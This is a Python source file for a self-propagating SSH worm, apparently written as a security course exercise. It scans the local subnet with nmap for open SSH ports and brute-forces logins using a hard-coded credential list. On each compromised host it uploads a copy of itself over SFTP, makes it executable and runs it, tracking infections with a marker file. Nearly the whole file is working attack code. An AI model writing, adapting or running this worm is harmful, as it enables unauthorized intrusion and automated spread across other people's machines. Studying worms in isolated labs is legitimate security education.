import paramiko
import sys
import socket
import nmap
import netinfo
import os
import sys
import socket, fcntl, struct
import netifaces


# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc') 
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


######################################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
######################################################################################

def isInfectedSystem():

    return os.path.isfile(INFECTED_MARKER_FILE)

######################################################################################
# Marks the system as infected
######################################################################################

def markInfected():

    open(INFECTED_MARKER_FILE, 'w')

######################################################################################
# Spread to  the other system and execute
# @param sshClient - the instance of the SSH client connected to the victim system
######################################################################################

def spreadAndExecute(sshClient):

    sftpClient = sshClient.open_sftp()
    
    sftpClient.put("/tmp/replicator_worm.py", "/tmp/" + "replicator_worm.py")
   
    sftpClient.chmod("/tmp/replicator_worm.py", 0777)
    
    sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
   
######################################################################################
# Try to connect to the given host given the existing credentials 
# @param host - the host system domain or IP
# @param userName - the user name
# @param passWord - the password
# @param sshClient - the SSH Client
# @return - 0 = Success, 1 = Probably Wrong Credentials, and 3 = Probably the server
# is down or is not running SSH
######################################################################################

def tryCredentials(host, userName, passWord, sshClient):

    connection_status = 1

    try:
        sshClient.connect(host, username=userName, password=passWord)
        connection_status = 0
        print("Connected Successfully!")

    except socket.error:
        connection_status = 3
        print("Server is Down!")

    except paramiko.SSHException:
        connection_status = 1
        print("Wrong Credentials!")

    return connection_status

######################################################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instance of the SSH paramiko class and the credentials that work in 
# a tuple (ssh, username, password).
# If the attack failed, returns a NULL
######################################################################################

def attackSystem(host):

    global credList

    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    successful_ssh = None

    for(username, password) in credList:

        connection_status = tryCredentials(host, username, password, ssh)

        if (connection_status == 0):
            successful_ssh = ssh

    return successful_ssh

######################################################################################
# Returns the IP of the current system
# @return - The IP address of the current system
######################################################################################

def getMyIP():

    networkInterfaces = netifaces.interfaces()

    ipAddr = None

    for netFace in networkInterfaces:

        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        if not addr == "127.0.0.1":

            ipAddr = addr
            break

    return ipAddr

######################################################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
######################################################################################

def getHostOnTheSameNework():

    portScanner = nmap.PortScanner()

    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

    hostInfo = portScanner.all_hosts()

    liveHosts = []

    for host in hostInfo:

        if portScanner[host].state() == "up":
            liveHosts.append(host)


    return liveHosts

# Continues execution if system is not aleady infected,
# otherwise stops execution
if not (isInfectedSystem()):
	
    #hard-coded IP of the attacker's machine
    origin_system = '192.168.1.6'
	
    # IP of the current system
    current_system = getMyIP()

    # Do not mark the system as infected if it's the attacker's machine
    if not current_system == origin_system:
        markInfected()
	
    networkHosts = getHostOnTheSameNework()

    # Removes attacker's system from the list of systems that are supposed to be attacked
    networkHosts.remove(origin_system)

    if current_system in networkHosts:

        networkHosts.remove(current_system)

    for host in networkHosts:

        print("Tying to attack : " , host)

        sshInfo = attackSystem(host)

        if sshInfo:

            print("Trying to Spread On : ", host)

            try:
                mySftpClient = sshInfo.open_sftp()

                mySftpClient.get('/tmp/infected.txt','/home/cpsc/infected.txt')

                print("This System is already INFECTED!!")

            except IOError:

                print("This system  should be infected!")

                spreadAndExecute(sshInfo)

                print("Spreading Complete! :) :)")

                break


else:

    print("Sytem is already infected !")

print "Exiting!"